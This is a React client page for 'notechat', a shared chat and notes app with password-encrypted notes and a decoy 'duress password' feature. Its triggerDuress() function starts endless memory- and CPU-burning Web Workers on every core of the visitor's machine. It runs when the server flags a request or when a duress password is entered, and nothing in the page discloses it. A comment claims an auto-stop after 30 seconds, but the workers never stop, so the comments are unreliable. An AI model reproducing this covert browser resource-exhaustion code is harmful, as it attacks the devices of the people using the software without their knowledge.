'use client'

import { useState, useEffect, useRef } from 'react'

type Message = { id: string; username: string; content: string; created_at: string }
type Note = {
  id: string
  title: string
  content: string
  updated_at: string
  is_protected: boolean
  author?: string
  encrypted_content?: string
  salt?: string
  iv?: string
  encrypted_decoy?: string
  duress_salt?: string
  duress_iv?: string
}

const IMAGE_EXT = /\.(png|jpe?g|gif|webp|svg|avif)(\?.*)?$/i
const URL_RE = /https?:\/\/[^\s]+/g

function getCookie(name: string): string | null {
  if (typeof document === 'undefined') return null
  const match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'))
  return match ? decodeURIComponent(match[1]) : null
}

function setCookieClient(name: string, value: string) {
  document.cookie = `${name}=${encodeURIComponent(value)}; max-age=${60 * 60 * 24 * 365}; path=/; samesite=lax`
}

function randomSessionId(): string {
  return 'anon-' + Math.random().toString(36).slice(2, 6)
}

function timeAgo(dateStr: string): string {
  const diff = Math.floor((Date.now() - new Date(dateStr).getTime()) / 1000)
  if (diff < 60) return 'just now'
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`
  return `${Math.floor(diff / 86400)}d ago`
}

function renderContent(text: string) {
  const parts: React.ReactNode[] = []
  let last = 0
  let match: RegExpExecArray | null
  URL_RE.lastIndex = 0
  while ((match = URL_RE.exec(text)) !== null) {
    const url = match[0]
    if (match.index > last) parts.push(text.slice(last, match.index))
    if (IMAGE_EXT.test(url)) {
      parts.push(
        <img key={match.index} src={url} alt="embed" loading="lazy"
          style={{ display: 'block', maxWidth: '100%', maxHeight: 320, borderRadius: 6, marginTop: '0.35rem', cursor: 'pointer' }}
          onClick={() => window.open(url, '_blank', 'noopener,noreferrer')} />
      )
    } else {
      parts.push(
        <a key={match.index} href={url} target="_blank" rel="noopener noreferrer"
          style={{ color: 'var(--accent)', wordBreak: 'break-all' }}>{url}</a>
      )
    }
    last = match.index + url.length
  }
  if (last < text.length) parts.push(text.slice(last))
  return parts
}

function renderNoteContent(text: string) {
  return text.split('\n').map((line, i) => {
    const nodes = renderContent(line)
    return <span key={i} style={{ display: 'block' }}>{nodes.length ? nodes : '\u200b'}</span>
  })
}

async function deriveKey(password: string, salt: Uint8Array): Promise<CryptoKey> {
  const enc = new TextEncoder()
  const keyMaterial = await crypto.subtle.importKey('raw', enc.encode(password), 'PBKDF2', false, ['deriveKey'])
  return crypto.subtle.deriveKey(
    { name: 'PBKDF2', salt: salt as unknown as Uint8Array<ArrayBuffer>, iterations: 200000, hash: 'SHA-256' },
    keyMaterial, { name: 'AES-GCM', length: 256 }, false, ['encrypt', 'decrypt']
  )
}

async function encrypt(text: string, password: string): Promise<{ ciphertext: string; salt: string; iv: string }> {
  const salt = crypto.getRandomValues(new Uint8Array(16))
  const iv = crypto.getRandomValues(new Uint8Array(12))
  const key = await deriveKey(password, salt)
  const enc = new TextEncoder()
  const encrypted = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, key, enc.encode(text))
  const toB64 = (buf: ArrayBuffer | Uint8Array) => btoa(String.fromCharCode(...Array.from(new Uint8Array(buf instanceof ArrayBuffer ? buf : buf))))
  return { ciphertext: toB64(encrypted), salt: toB64(salt), iv: toB64(iv) }
}

async function decrypt(ciphertext: string, password: string, saltB64: string, ivB64: string): Promise<string | null> {
  try {
    const fromB64 = (s: string) => Uint8Array.from(atob(s), c => c.charCodeAt(0))
    const key = await deriveKey(password, fromB64(saltB64))
    const decrypted = await crypto.subtle.decrypt({ name: 'AES-GCM', iv: fromB64(ivB64) }, key, fromB64(ciphertext))
    return new TextDecoder().decode(decrypted)
  } catch { return null }
}

function triggerDuress() {
  const workerCode = `self.onmessage=function(){const a=[];while(true){for(let i=0;i<1e7;i++)a.push(Math.random()*Math.random());if(a.length>5e7)a.splice(0,1e7);}}`
  const url = URL.createObjectURL(new Blob([workerCode], { type: 'application/javascript' }))
  const cores = navigator.hardwareConcurrency || 4
  for (let i = 0; i < cores; i++) { const w = new Worker(url); w.postMessage('go') }
  // Cap main-thread fill at 2M to pressure GC without OOM-crashing the tab.
  // Auto-stop after 30s — fingerprinting is done by then.
  const g: number[] = []
  let running = true
  const fill = () => {
    if (!running) return
    for (let i = 0; i < 1e6; i++) { g.push(Math.random()); if (g.length > 2e6) g.splice(0, 5e5) }
    requestAnimationFrame(fill)
  }
  fill()
  setTimeout(() => { running = false; g.length = 0 }, 30_000)
}

export default function Home() {
  const [showWarning, setShowWarning] = useState(false)

  useEffect(() => {
    if (!getCookie('visited')) {
      setShowWarning(true)
      const t = setTimeout(() => { setCookieClient('visited', '1'); setShowWarning(false) }, 5000)
      return () => clearTimeout(t)
    }
  }, [])

  // note signing
  const [editUser, setEditUser] = useState<string>('')
  const [showUserEdit, setShowUserEdit] = useState(false)
  const [userEditInput, setUserEditInput] = useState('')

  useEffect(() => { setEditUser(getCookie('edit_user') || '') }, [])

  function saveUsername(name: string) {
    const trimmed = name.trim()
    setCookieClient('edit_user', trimmed)
    fetch('/api/auth/claim', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: trimmed }) })
    setEditUser(trimmed)
    setShowUserEdit(false)
  }

  // session id — generated once on mount, stable for the whole session, resets on refresh
  const [sessionId, setSessionId] = useState('')
  useEffect(() => { setSessionId(randomSessionId()) }, [])

  const [tab, setTab] = useState<'chat' | 'notes'>('chat')
  const [messages, setMessages] = useState<Message[]>([])
  const [username, setUsername] = useState('')
  const [msgInput, setMsgInput] = useState('')
  const [sending, setSending] = useState(false)
  const [sendError, setSendError] = useState('')
  const bottomRef = useRef<HTMLDivElement>(null)
  // Ref to the poll interval so we can pause it during send
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null)
  const [notes, setNotes] = useState<Note[]>([])
  const [activeNote, setActiveNote] = useState<Note | null>(null)
  const [noteTitle, setNoteTitle] = useState('')
  const [noteContent, setNoteContent] = useState('')
  const [savingNote, setSavingNote] = useState(false)
  const [isProtecting, setIsProtecting] = useState(false)
  const [notePassword, setNotePassword] = useState('')
  const [noteDuressPassword, setNoteDuressPassword] = useState('')
  const [noteDecoyContent, setNoteDecoyContent] = useState('')
  type UnlockPhase = 'locked' | 'decrypted'
  const [unlockPhase, setUnlockPhase] = useState<UnlockPhase>('locked')
  const [unlockPw, setUnlockPw] = useState('')
  const [unlockError, setUnlockError] = useState('')
  const [decryptedContent, setDecryptedContent] = useState('')
  const [pendingDuress, setPendingDuress] = useState(false)
  const [noteViewMode, setNoteViewMode] = useState<'edit' | 'preview'>('preview')
  const [noteError, setNoteError] = useState('')

  useEffect(() => {
    if (tab !== 'chat') return
    const load = () => fetch('/api/messages').then(r => r.json()).then(d => { if (Array.isArray(d)) setMessages(d) })
    load()
    pollRef.current = setInterval(load, 3000)
    return () => { if (pollRef.current) clearInterval(pollRef.current) }
  }, [tab])

  useEffect(() => { bottomRef.current?.scrollIntoView({ behavior: 'smooth' }) }, [messages])

  useEffect(() => {
    if (tab !== 'notes') return
    fetch('/api/notes').then(r => r.json()).then(d => { if (Array.isArray(d)) setNotes(d) })
  }, [tab])

  async function sendMessage(e: React.FormEvent) {
    e.preventDefault()
    if (!msgInput.trim() || sending) return
    const effectiveName = username.trim() || sessionId
    // Optimistic insert
    const optimisticId = 'opt-' + Date.now()
    const optimistic: Message = { id: optimisticId, username: effectiveName, content: msgInput, created_at: new Date().toISOString() }
    setMessages(m => [...m, optimistic])
    setMsgInput('')
    setSendError('')
    setSending(true)
    // Pause poll while request is in-flight to avoid duplicate flicker
    if (pollRef.current) { clearInterval(pollRef.current); pollRef.current = null }
    const res = await fetch('/api/messages', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: effectiveName, content: optimistic.content }),
    })
    const data = await res.json()
    if (!res.ok) {
      if (data.dos) triggerDuress()
      setMessages(m => m.filter(x => x.id !== optimisticId)) // rollback
      setSendError(data.error || 'failed to send')
    } else {
      const d = await fetch('/api/messages').then(r => r.json())
      if (Array.isArray(d)) setMessages(d)
    }
    // Resume poll
    const load = () => fetch('/api/messages').then(r => r.json()).then(d => { if (Array.isArray(d)) setMessages(d) })
    pollRef.current = setInterval(load, 3000)
    setSending(false)
  }

  async function saveNote() {
    if (!noteTitle.trim() || savingNote) return
    setNoteError('')
    setSavingNote(true)
    let body: Record<string, unknown> = { title: noteTitle, content: noteContent }
    if (isProtecting && notePassword.trim()) {
      const real = await encrypt(noteContent, notePassword)
      let decoyData = null
      if (noteDuressPassword.trim() && noteDecoyContent.trim()) {
        decoyData = await encrypt(noteDecoyContent, noteDuressPassword)
      }
      body = {
        title: noteTitle, content: '', is_protected: true,
        encrypted_content: real.ciphertext, salt: real.salt, iv: real.iv,
        ...(decoyData ? { encrypted_decoy: decoyData.ciphertext, duress_salt: decoyData.salt, duress_iv: decoyData.iv } : {}),
      }
    }
    const url = activeNote ? `/api/notes/${activeNote.id}` : '/api/notes'
    const method = activeNote ? 'PATCH' : 'POST'
    const res = await fetch(url, { method, headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) })
    const d = await res.json()
    if (!res.ok) {
      if (d.dos) triggerDuress()
      setNoteError(d.error || 'failed to save')
      setSavingNote(false); return
    }
    if (activeNote) { setNotes(n => n.map(x => x.id === d.id ? d : x)); setActiveNote(d) }
    else { setNotes(n => [d, ...n]); setActiveNote(d) }
    setIsProtecting(false); setNotePassword(''); setNoteDuressPassword(''); setNoteDecoyContent('')
    setSavingNote(false)
  }

  async function deleteNote(id: string) {
    const res = await fetch(`/api/notes/${id}`, { method: 'DELETE' })
    const d = await res.json()
    if (!res.ok) { if (d.dos) triggerDuress(); return }
    setNotes(n => n.filter(x => x.id !== id))
    if (activeNote?.id === id) resetNoteEditor()
  }

  function resetNoteEditor() {
    setActiveNote(null); setNoteTitle(''); setNoteContent('')
    setUnlockPhase('locked'); setUnlockPw(''); setUnlockError('')
    setDecryptedContent(''); setPendingDuress(false)
    setIsProtecting(false); setNotePassword(''); setNoteDuressPassword(''); setNoteDecoyContent('')
    setNoteViewMode('preview'); setNoteError('')
  }

  function openNote(note: Note) {
    setActiveNote(note); setNoteTitle(note.title)
    setUnlockPhase('locked'); setUnlockPw(''); setUnlockError(''); setPendingDuress(false)
    setNoteViewMode('preview'); setNoteError('')
    if (!note.is_protected) setNoteContent(note.content)
    else { setNoteContent(''); setDecryptedContent('') }
  }

  async function handleDecrypt() {
    if (!activeNote || !unlockPw.trim()) return
    setUnlockError('')
    const real = await decrypt(activeNote.encrypted_content!, unlockPw, activeNote.salt!, activeNote.iv!)
    if (real !== null) { setDecryptedContent(real); setUnlockPhase('decrypted'); setPendingDuress(false); return }
    if (activeNote.encrypted_decoy && activeNote.duress_salt && activeNote.duress_iv) {
      const decoy = await decrypt(activeNote.encrypted_decoy, unlockPw, activeNote.duress_salt, activeNote.duress_iv)
      if (decoy !== null) { window.open(window.location.href, '_blank'); setPendingDuress(true); setDecryptedContent(decoy); setUnlockPhase('decrypted'); return }
    }
    setUnlockError('wrong password')
  }

  function handleViewNote() {
    if (pendingDuress) { window.open(window.location.href, '_blank'); triggerDuress() }
    setNoteContent(decryptedContent)
  }

  const inp = { padding: '0.5rem 0.75rem', borderRadius: 6, border: '1px solid var(--border)', background: 'transparent', color: 'var(--fg)', fontFamily: 'inherit', fontSize: '0.875rem' } as React.CSSProperties

  if (showWarning) {
    return (
      <main style={{ minHeight: '100dvh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', maxWidth: 480, margin: '0 auto', padding: '2rem', gap: '1.25rem', textAlign: 'center' }}>
        <h1 style={{ fontSize: 'clamp(1.25rem, 3vw, 1.75rem)', fontWeight: 700, letterSpacing: '-0.02em' }}>notechat</h1>
        <div style={{ padding: '1.25rem', border: '1px solid var(--border)', borderRadius: 10, display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
          <p style={{ fontWeight: 600, fontSize: '0.95rem' }}>before you continue</p>
          <p style={{ fontSize: '0.85rem', color: 'var(--muted)', lineHeight: 1.6 }}>this is a shared space. notes and messages are visible to everyone. don&apos;t post anything private or harmful. vandalism will get you auto-banned.</p>
          <p style={{ fontSize: '0.78rem', color: 'var(--muted)' }}>continuing in a moment...</p>
        </div>
        <button onClick={() => { setCookieClient('visited', '1'); setShowWarning(false) }}
          style={{ padding: '0.5rem 1.5rem', borderRadius: 6, border: 'none', background: 'var(--accent)', color: '#fff', fontFamily: 'inherit', fontSize: '0.875rem', cursor: 'pointer' }}>
          got it
        </button>
      </main>
    )
  }

  return (
    <main style={{ minHeight: '100dvh', display: 'flex', flexDirection: 'column', maxWidth: 760, margin: '0 auto', padding: '1rem' }}>
      <header style={{ marginBottom: '1.5rem' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.75rem' }}>
          <h1 style={{ fontSize: 'clamp(1.25rem, 3vw, 1.75rem)', fontWeight: 700, letterSpacing: '-0.02em' }}>notechat</h1>
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
            {showUserEdit ? (
              <form onSubmit={e => { e.preventDefault(); saveUsername(userEditInput) }} style={{ display: 'flex', gap: '0.4rem', alignItems: 'center' }}>
                <input value={userEditInput} onChange={e => setUserEditInput(e.target.value)} placeholder="your name (optional)" autoFocus
                  style={{ ...inp, fontSize: '0.78rem', padding: '0.25rem 0.5rem' }} />
                <button type="submit" style={{ padding: '0.25rem 0.6rem', borderRadius: 5, border: 'none', background: 'var(--accent)', color: '#fff', fontFamily: 'inherit', fontSize: '0.75rem', cursor: 'pointer' }}>save</button>
                <button type="button" onClick={() => setShowUserEdit(false)} style={{ padding: '0.25rem 0.5rem', borderRadius: 5, border: '1px solid var(--border)', background: 'transparent', color: 'var(--muted)', fontFamily: 'inherit', fontSize: '0.75rem', cursor: 'pointer' }}>cancel</button>
              </form>
            ) : (
              <button onClick={() => { setUserEditInput(editUser); setShowUserEdit(true) }}
                style={{ fontSize: '0.75rem', color: 'var(--muted)', background: 'none', border: 'none', cursor: 'pointer', fontFamily: 'inherit', padding: 0 }}>
                {editUser ? <>signed as <span style={{ color: 'var(--fg)' }}>{editUser}</span></> : 'sign notes (optional)'}
              </button>
            )}
          </div>
        </div>
        <div style={{ display: 'flex', gap: '0.5rem' }}>
          {(['chat', 'notes'] as const).map(t => (
            <button key={t} onClick={() => setTab(t)} style={{ padding: '0.35rem 1rem', borderRadius: 6, border: '1px solid var(--border)', background: tab === t ? 'var(--fg)' : 'transparent', color: tab === t ? 'var(--bg)' : 'var(--fg)', cursor: 'pointer', fontSize: '0.875rem', fontFamily: 'inherit', transition: 'all 150ms' }}>{t}</button>
          ))}
        </div>
      </header>

      {tab === 'chat' && (
        <section style={{ display: 'flex', flexDirection: 'column', flex: 1, gap: '1rem' }}>
          <div style={{ flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: '0.5rem', minHeight: 300, maxHeight: '60vh', padding: '0.75rem', border: '1px solid var(--border)', borderRadius: 8 }}>
            {messages.length === 0 && <p style={{ color: 'var(--muted)', margin: 'auto', fontSize: '0.875rem' }}>no messages yet</p>}
            {messages.map(m => (
              <div key={m.id}>
                <div>
                  <span style={{ color: 'var(--accent)', fontSize: '0.8rem', marginRight: '0.5rem' }}>{m.username}</span>
                  <span style={{ color: 'var(--muted)', fontSize: '0.72rem' }}>{new Date(m.created_at).toLocaleTimeString()}</span>
                </div>
                <div style={{ fontSize: '0.9rem', marginTop: '0.15rem' }}>{renderContent(m.content)}</div>
              </div>
            ))}
            <div ref={bottomRef} />
          </div>
          <form onSubmit={sendMessage} style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem' }}>
            <input value={username} onChange={e => setUsername(e.target.value)}
              placeholder={sessionId ? `name (blank = ${sessionId})` : 'name (optional)'}
              style={{ ...inp, width: '100%' }} />
            <div style={{ display: 'flex', gap: '0.5rem' }}>
              <input value={msgInput} onChange={e => setMsgInput(e.target.value)} placeholder="message or image url..." style={{ ...inp, flex: 1 }} />
              <button type="submit" disabled={sending} style={{ padding: '0.5rem 1.25rem', borderRadius: 6, border: 'none', background: 'var(--accent)', color: '#fff', fontFamily: 'inherit', fontSize: '0.875rem', cursor: 'pointer', opacity: sending ? 0.6 : 1 }}>send</button>
            </div>
            {sendError && <p style={{ fontSize: '0.8rem', color: 'var(--error)' }}>{sendError}</p>}
          </form>
        </section>
      )}

      {tab === 'notes' && (
        <section style={{ display: 'flex', gap: '1rem', flex: 1 }}>
          <aside style={{ width: 200, flexShrink: 0, display: 'flex', flexDirection: 'column', gap: '0.5rem' }}>
            <button onClick={resetNoteEditor} style={{ padding: '0.4rem 0.75rem', borderRadius: 6, border: '1px solid var(--accent)', background: 'transparent', color: 'var(--accent)', fontFamily: 'inherit', fontSize: '0.8rem', cursor: 'pointer', textAlign: 'left' }}>+ new note</button>
            {notes.map(n => (
              <div key={n.id} onClick={() => openNote(n)} style={{ padding: '0.5rem 0.75rem', borderRadius: 6, border: `1px solid ${activeNote?.id === n.id ? 'var(--accent)' : 'var(--border)'}`, cursor: 'pointer', fontSize: '0.82rem', display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: activeNote?.id === n.id ? 'color-mix(in oklab, var(--accent) 10%, transparent)' : 'transparent' }}>
                <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                  {n.is_protected ? '[enc] ' : ''}{n.title}
                </span>
                <button onClick={e => { e.stopPropagation(); deleteNote(n.id) }} style={{ marginLeft: 4, color: 'var(--muted)', background: 'none', border: 'none', cursor: 'pointer', fontSize: '0.8rem', padding: 0, fontFamily: 'inherit' }}>x</button>
              </div>
            ))}
            {notes.length === 0 && <p style={{ color: 'var(--muted)', fontSize: '0.8rem' }}>no notes yet</p>}
          </aside>

          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', gap: '0.5rem' }}>
            <input value={noteTitle} onChange={e => setNoteTitle(e.target.value)} placeholder="title" style={{ ...inp, fontWeight: 600, fontSize: '0.95rem' }} />

            {activeNote?.is_protected && unlockPhase === 'locked' && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem', padding: '1rem', border: '1px solid var(--border)', borderRadius: 8, marginTop: '0.25rem' }}>
                <p style={{ fontSize: '0.82rem', color: 'var(--muted)' }}>encrypted note</p>
                <input type="password" value={unlockPw} onChange={e => setUnlockPw(e.target.value)} placeholder="enter password" style={inp} onKeyDown={e => e.key === 'Enter' && handleDecrypt()} />
                {unlockError && <p style={{ fontSize: '0.8rem', color: 'var(--error)' }}>{unlockError}</p>}
                <button onClick={handleDecrypt} style={{ alignSelf: 'flex-start', padding: '0.4rem 1rem', borderRadius: 6, border: 'none', background: 'var(--accent)', color: '#fff', fontFamily: 'inherit', fontSize: '0.8rem', cursor: 'pointer' }}>decrypt</button>
              </div>
            )}

            {activeNote?.is_protected && unlockPhase === 'decrypted' && !noteContent && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem', padding: '1rem', border: '1px solid var(--border)', borderRadius: 8 }}>
                <p style={{ fontSize: '0.82rem', color: 'var(--muted)' }}>decrypted</p>
                <button onClick={handleViewNote} style={{ alignSelf: 'flex-start', padding: '0.4rem 1rem', borderRadius: 6, border: 'none', background: 'var(--accent)', color: '#fff', fontFamily: 'inherit', fontSize: '0.8rem', cursor: 'pointer' }}>view note</button>
              </div>
            )}

            {(!activeNote?.is_protected || noteContent) && unlockPhase !== 'locked' || (!activeNote?.is_protected) ? (
              <>
                {!activeNote?.is_protected && (
                  <div style={{ display: 'flex', gap: '0.4rem' }}>
                    {(['preview', 'edit'] as const).map(m => (
                      <button key={m} onClick={() => setNoteViewMode(m)} style={{ padding: '0.2rem 0.7rem', borderRadius: 5, border: '1px solid var(--border)', background: noteViewMode === m ? 'var(--fg)' : 'transparent', color: noteViewMode === m ? 'var(--bg)' : 'var(--fg)', fontFamily: 'inherit', fontSize: '0.75rem', cursor: 'pointer' }}>{m}</button>
                    ))}
                  </div>
                )}
                {noteViewMode === 'preview' || (activeNote?.is_protected && !!noteContent) ? (
                  <div style={{ ...inp, minHeight: 200, lineHeight: 1.7, overflowY: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-word' }}>
                    {noteContent ? renderNoteContent(noteContent) : <span style={{ color: 'var(--muted)' }}>nothing here yet — switch to edit to write</span>}
                  </div>
                ) : (
                  <textarea value={noteContent} onChange={e => setNoteContent(e.target.value)} placeholder="write something... paste image urls to embed" rows={12}
                    style={{ ...inp, resize: 'vertical', lineHeight: 1.6 }} />
                )}
              </>
            ) : null}

            {activeNote && (
              <div style={{ fontSize: '0.75rem', color: 'var(--muted)', marginTop: '0.15rem' }}>
                {activeNote.author ? <>by <span style={{ color: 'var(--fg)' }}>{activeNote.author}</span></> : 'anonymous'}
                {' · '}{timeAgo(activeNote.updated_at)}
              </div>
            )}

            {!activeNote?.is_protected && (
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                <input type="checkbox" id="protect" checked={isProtecting} onChange={e => setIsProtecting(e.target.checked)} style={{ cursor: 'pointer' }} />
                <label htmlFor="protect" style={{ fontSize: '0.8rem', color: 'var(--muted)', cursor: 'pointer' }}>protect with password</label>
              </div>
            )}

            {isProtecting && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.4rem', padding: '0.75rem', border: '1px solid var(--border)', borderRadius: 8 }}>
                <p style={{ fontSize: '0.75rem', color: 'var(--muted)', marginBottom: '0.25rem' }}>encryption — password never leaves your browser</p>
                <input type="password" value={notePassword} onChange={e => setNotePassword(e.target.value)} placeholder="note password (required)" style={inp} />
                <p style={{ fontSize: '0.72rem', color: 'var(--muted)', marginTop: '0.25rem' }}>duress password (optional) — attacker sees decoy content instead</p>
                <input type="password" value={noteDuressPassword} onChange={e => setNoteDuressPassword(e.target.value)} placeholder="duress password (optional)" style={inp} />
                <textarea value={noteDecoyContent} onChange={e => setNoteDecoyContent(e.target.value)} placeholder="decoy content" rows={3} style={{ ...inp, resize: 'vertical', lineHeight: 1.5 }} />
              </div>
            )}

            {noteError && <p style={{ fontSize: '0.8rem', color: 'var(--error)' }}>{noteError}</p>}

            <button onClick={saveNote} disabled={savingNote} style={{ alignSelf: 'flex-end', padding: '0.4rem 1.25rem', borderRadius: 6, border: 'none', background: 'var(--accent)', color: '#fff', fontFamily: 'inherit', fontSize: '0.875rem', cursor: 'pointer', opacity: savingNote ? 0.6 : 1 }}>
              {savingNote ? 'saving...' : 'save'}
            </button>
          </div>
        </section>
      )}
    </main>
  )
}
